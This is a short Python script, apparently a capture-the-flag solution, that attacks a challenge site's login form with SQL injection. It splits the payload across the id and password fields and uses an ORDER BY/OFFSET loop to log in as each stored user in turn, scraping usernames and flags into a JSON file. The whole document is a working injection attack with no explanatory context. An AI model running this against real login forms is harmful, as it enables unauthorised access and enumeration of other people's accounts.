import requests
import re
import json
url = 'https://hollywood.chall.necst.it'
results = []


for i in range(500):
    data = {
        'id': "')OR",
        'username': 'aaa',
        'password': f"IS NOT NULL OR TRUE ORDER BY usrn OFFSET {i} ROWS;--"
    }

    response = requests.post(url, data=data)
    content = response.text

    if "Welcome" in content:
        user_match = re.search(r"Welcome, ([^<]+)!", content)
        flag_match = re.search(r"Your flag is: ([^<]+)</h3>", content)

        if user_match and flag_match:
            username = user_match.group(1)
            flag = flag_match.group(1)
            results.append({
                "offset": i,
                "username": username,
                "flag": flag
            })
            print(f"[+] Found user at offset {i}: {username}")
        else:
            print(f"[!] Unexpected format at offset {i}")
    else:
        print(f"[-] No result at offset {i}")

# Enregistrement du résultat dans un fichier JSON
output_file = "results.json"
with open(output_file, "w") as f:
    json.dump(results, f, indent=4)

print(f"\n✅ Résultats enregistrés dans {output_file}")

